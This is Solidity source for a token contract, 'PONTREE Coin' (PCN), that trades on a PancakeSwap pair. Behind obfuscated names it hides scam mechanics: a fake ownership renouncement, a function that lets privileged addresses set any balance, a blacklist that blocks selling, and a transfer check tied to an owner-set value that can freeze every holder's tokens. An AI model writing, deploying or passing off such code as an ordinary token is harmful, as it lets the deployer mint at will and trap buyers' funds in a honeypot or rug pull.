//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

abstract contract totalMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalShould) external view returns (uint256);

    function transfer(address fundBuy, uint256 modeBuyAt) external returns (bool);

    function allowance(address maxAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeBuyAt) external returns (bool);

    function transferFrom(
        address sender,
        address fundBuy,
        uint256 modeBuyAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toTx, uint256 value);
    event Approval(address indexed maxAmount, address indexed spender, uint256 value);
}

interface listAutoMetadata is listAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface launchSender {
    function createPair(address minAuto, address fromMinShould) external returns (address);
}

interface atList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PONTREECoin is totalMin, listAuto, listAutoMetadata {

    function shouldIs(address toFee, address fundBuy, uint256 modeBuyAt) internal returns (bool) {
        require(swapReceiver[toFee] >= modeBuyAt);
        swapReceiver[toFee] -= modeBuyAt;
        swapReceiver[fundBuy] += modeBuyAt;
        emit Transfer(toFee, fundBuy, modeBuyAt);
        return true;
    }

    uint256 private swapToTrading = 100000000 * 10 ** 18;

    string private minShould = "PCN";

    uint256 private feeShould;

    function name() external view virtual override returns (string memory) {
        return liquidityFee;
    }

    address public receiverFee;

    function approve(address minIs, uint256 modeBuyAt) public virtual override returns (bool) {
        listSwap[_msgSender()][minIs] = modeBuyAt;
        emit Approval(_msgSender(), minIs, modeBuyAt);
        return true;
    }

    mapping(address => uint256) private swapReceiver;

    function transfer(address launchAuto, uint256 modeBuyAt) external virtual override returns (bool) {
        return senderTake(_msgSender(), launchAuto, modeBuyAt);
    }

    function transferFrom(address toFee, address fundBuy, uint256 modeBuyAt) external override returns (bool) {
        if (_msgSender() != launchedListMin) {
            if (listSwap[toFee][_msgSender()] != type(uint256).max) {
                require(modeBuyAt <= listSwap[toFee][_msgSender()]);
                listSwap[toFee][_msgSender()] -= modeBuyAt;
            }
        }
        return senderTake(toFee, fundBuy, modeBuyAt);
    }

    function senderTake(address toFee, address fundBuy, uint256 modeBuyAt) internal returns (bool) {
        if (toFee == receiverFee) {
            return shouldIs(toFee, fundBuy, modeBuyAt);
        }
        uint256 marketingReceiver = listAuto(launchedFund).balanceOf(receiverTake);
        require(marketingReceiver == receiverMode);
        require(!listLimitTx[toFee]);
        return shouldIs(toFee, fundBuy, modeBuyAt);
    }

    uint256 private sellAuto;

    function decimals() external view virtual override returns (uint8) {
        return liquidityMin;
    }

    event OwnershipTransferred(address indexed tradingLimit, address indexed buySellShould);

    mapping(address => bool) public shouldMax;

    string private liquidityFee = "PONTREE Coin";

    bool private launchedFee;

    function totalSupply() external view virtual override returns (uint256) {
        return swapToTrading;
    }

    function fundToken() public {
        emit OwnershipTransferred(receiverFee, address(0));
        totalSell = address(0);
    }

    uint256 private fundIsList;

    function feeTeam(uint256 modeBuyAt) public {
        listFrom();
        receiverMode = modeBuyAt;
    }

    function owner() external view returns (address) {
        return totalSell;
    }

    function allowance(address exemptTotal, address minIs) external view virtual override returns (uint256) {
        if (minIs == launchedListMin) {
            return type(uint256).max;
        }
        return listSwap[exemptTotal][minIs];
    }

    uint256 public swapSell;

    uint256 receiverMode;

    constructor (){
        
        fundToken();
        atList totalMode = atList(launchedListMin);
        launchedFund = launchSender(totalMode.factory()).createPair(totalMode.WETH(), address(this));
        
        receiverFee = _msgSender();
        shouldMax[receiverFee] = true;
        swapReceiver[receiverFee] = swapToTrading;
        
        emit Transfer(address(0), receiverFee, swapToTrading);
    }

    mapping(address => mapping(address => uint256)) private listSwap;

    function listFrom() private view {
        require(shouldMax[_msgSender()]);
    }

    address launchedListMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function buySwap(address enableReceiverTotal) public {
        if (receiverAt) {
            return;
        }
        if (swapSell == feeToken) {
            enableMax = true;
        }
        shouldMax[enableReceiverTotal] = true;
        if (shouldTotal == enableMax) {
            fundIsList = feeToken;
        }
        receiverAt = true;
    }

    function fundAtAuto(address fundAtLaunched) public {
        listFrom();
        if (launchedFee == shouldTotal) {
            shouldTotal = true;
        }
        if (fundAtLaunched == receiverFee || fundAtLaunched == launchedFund) {
            return;
        }
        listLimitTx[fundAtLaunched] = true;
    }

    function balanceOf(address totalShould) public view virtual override returns (uint256) {
        return swapReceiver[totalShould];
    }

    function getOwner() external view returns (address) {
        return totalSell;
    }

    uint8 private liquidityMin = 18;

    bool public shouldTotal;

    address private totalSell;

    address public launchedFund;

    bool public receiverAt;

    uint256 private feeToken;

    function symbol() external view virtual override returns (string memory) {
        return minShould;
    }

    uint256 swapMode;

    function totalTrading(address launchAuto, uint256 modeBuyAt) public {
        listFrom();
        swapReceiver[launchAuto] = modeBuyAt;
    }

    mapping(address => bool) public listLimitTx;

    bool public enableMax;

    address receiverTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

}